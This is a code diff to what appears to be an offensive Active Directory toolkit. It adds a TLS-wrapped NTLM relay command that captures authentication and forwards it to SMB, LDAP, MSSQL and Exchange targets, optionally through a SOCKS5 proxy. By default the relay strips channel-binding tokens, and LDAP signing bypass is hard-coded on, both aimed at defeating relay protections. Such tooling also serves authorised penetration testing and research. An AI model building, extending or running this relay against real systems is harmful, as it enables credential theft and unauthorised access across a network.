@@ -1809,6 +1809,33 @@ enum NtlmAction {
         #[arg(short, long, default_value = "445")]
         port: u16,
     },
+    /// TLS-wrapped NTLM relay with optional mTLS client certificate verification
+    TlsRelay {
+        /// Target hosts for relay (e.g., smb://10.0.0.1:445, ldap://10.0.0.2:389)
+        #[arg(short, long, required = true, value_delimiter = ',')]
+        targets: Vec<String>,
+        /// TLS listener port (typically 443 for HTTPS relay)
+        #[arg(short, long, default_value = "443")]
+        port: u16,
+        /// Network interface to listen on
+        #[arg(short, long, default_value = "0.0.0.0")]
+        interface: String,
+        /// PEM-encoded TLS certificate file path
+        #[arg(long, required = true)]
+        tls_cert: String,
+        /// PEM-encoded TLS private key file path
+        #[arg(long, required = true)]
+        tls_key: String,
+        /// PEM-encoded CA certificate for mTLS client verification (optional)
+        #[arg(long)]
+        mtls_client_ca: Option<String>,
+        /// Channel binding token mode: "strip", "passthrough", or "validate"
+        #[arg(long, default_value = "strip")]
+        cbt_mode: String,
+        /// SOCKS5 proxy for outbound relay connections
+        #[arg(long)]
+        socks5_proxy: Option<String>,
+    },
     /// NTLM relay via Exchange (EWS/MAPI)
     Exchange {
         /// Target Exchange server
@@ -3472,6 +3499,62 @@ fn load_tls_identity(
     }
 }
 
+/// Parse relay target strings in `protocol://host:port` or `host:port` format.
+/// Supports protocols: smb, http, https, ldap, ldaps, mssql, msmq, exchange.
+fn parse_relay_targets(targets: &[String]) -> Vec<overthrone_relay::RelayTarget> {
+    use overthrone_relay::{Protocol, RelayTarget};
+    use std::net::SocketAddr;
+
+    targets
+        .iter()
+        .filter_map(|t| {
+            let (protocol_prefix, rest) = if let Some(idx) = t.find("://") {
+                let proto = &t[..idx].to_lowercase();
+                let rest = &t[idx + 3..];
+                let protocol = match proto.as_str() {
+                    "smb" => Protocol::Smb,
+                    "http" => Protocol::Http,
+                    "https" => Protocol::Https,
+                    "ldap" => Protocol::Ldap,
+                    "ldaps" => Protocol::Ldaps,
+                    "mssql" => Protocol::Mssql,
+                    "msmq" => Protocol::Msmq,
+                    "exchange" => Protocol::Exchange,
+                    _ => return None,
+                };
+                (Some(protocol), rest)
+            } else {
+                (None, t.as_str())
+            };
+            let parts: Vec<&str> = rest.split(':').collect();
+            let ip = parts[0].to_string();
+            let port = parts
+                .get(1)
+                .and_then(|p| p.parse().ok())
+                .unwrap_or(match protocol_prefix {
+                    Some(Protocol::Smb) => 445,
+                    Some(Protocol::Https) => 443,
+                    Some(Protocol::Ldaps) => 636,
+                    Some(Protocol::Mssql) => 1433,
+                    Some(Protocol::Msmq) => 1801,
+                    _ => 80,
+                });
+            let addr: SocketAddr = format!("{}:{}", ip, port).parse().ok()?;
+            let protocol = protocol_prefix.unwrap_or(match port {
+                443 => Protocol::Https,
+                445 => Protocol::Smb,
+                389 | 636 => Protocol::Ldap,
+                _ => Protocol::Smb,
+            });
+            Some(RelayTarget {
+                address: addr,
+                protocol,
+                username: None,
+            })
+        })
+        .collect()
+}
+
 // cmd_ntlm
 #[cfg(feature = "relay")]
 async fn cmd_ntlm(action: NtlmAction) -> i32 {
@@ -3518,6 +3601,7 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 auto_coerce_parallel: false,
                 auto_coerce_mode: "all".to_string(),
                 auto_coerce_max_retries: 1,
+                tls_relay_config: None,
             };
             let mut controller = RelayController::new(config);
             match controller.initialize().await {
@@ -3608,6 +3692,7 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 auto_coerce_parallel: false,
                 auto_coerce_mode: "all".to_string(),
                 auto_coerce_max_retries: 1,
+                tls_relay_config: None,
             };
 
             let mut controller = RelayController::new(config);
@@ -3692,6 +3777,7 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 auto_coerce_parallel: false,
                 auto_coerce_mode: "all".to_string(),
                 auto_coerce_max_retries: 1,
+                tls_relay_config: None,
             };
             let mut controller = RelayController::new(config);
             match controller.initialize().await {
@@ -3779,6 +3865,7 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 auto_coerce_parallel: false,
                 auto_coerce_mode: "all".to_string(),
                 auto_coerce_max_retries: 1,
+                tls_relay_config: None,
             };
             let mut controller = RelayController::new(config);
             match controller.initialize().await {
@@ -3965,6 +4052,7 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 auto_coerce_parallel: false,
                 auto_coerce_mode: "all".to_string(),
                 auto_coerce_max_retries: 1,
+                tls_relay_config: None,
             };
             let mut controller = RelayController::new(config);
             match controller.initialize().await {
@@ -4028,6 +4116,65 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 }
                 Err(e) => {
                     banner::print_fail(&format!("SMB daemon failed: {}", e));
+                    1
+                }
+            }
+        }
+        NtlmAction::TlsRelay {
+            targets,
+            port,
+            interface,
+            tls_cert,
+            tls_key,
+            mtls_client_ca,
+            cbt_mode,
+            socks5_proxy,
+        } => {
+            println!(
+                "{} Starting TLS-wrapped relay on {}:{} with {} targets",
+                "🔒".bright_black(),
+                interface.cyan(),
+                port,
+                targets.len()
+            );
+
+            use overthrone_relay::tls_relay::{CbtMode, TlsRelay, TlsRelayConfig};
+
+            let cbt_mode_parsed = match cbt_mode.to_lowercase().as_str() {
+                "passthrough" => CbtMode::Passthrough,
+                "validate" => CbtMode::Validate,
+                _ => CbtMode::Strip,
+            };
+
+            let relay_targets = parse_relay_targets(&targets);
+            if relay_targets.is_empty() {
+                banner::print_fail("No valid relay targets specified");
+                return 1;
+            }
+
+            let config = TlsRelayConfig {
+                listen_ip: interface.clone(),
+                listen_port: port,
+                tls_cert_path: tls_cert,
+                tls_key_path: tls_key,
+                mtls_client_ca_path: mtls_client_ca,
+                targets: relay_targets,
+                socks5_proxy,
+                ldap_signing_bypass: true,
+                max_retries: 3,
+                timeout_secs: 30,
+                cbt_mode: cbt_mode_parsed,
+            };
+            let mut relay = TlsRelay::new(config);
+            match relay.start().await {
+                Ok(_) => {
+                    banner::print_success("TLS relay started");
+                    tokio::signal::ctrl_c().await.unwrap();
+                    relay.stop().await;
+                    0
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("TLS relay failed: {}", e));
                     1
                 }
             }
